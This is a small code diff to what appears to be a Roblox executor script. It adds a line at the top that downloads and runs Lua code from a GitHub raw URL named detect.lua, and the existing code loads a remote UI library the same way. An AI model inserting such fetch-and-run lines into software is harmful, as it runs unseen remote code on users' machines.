@@ -1,3 +1,6 @@
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/heap-v/FlerixHub/main/detect.lua", true))()
+
 if game.PlaceId == 10118559731 then
 local DiscordLib =
     loadstring(game:HttpGet "https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/discord")()
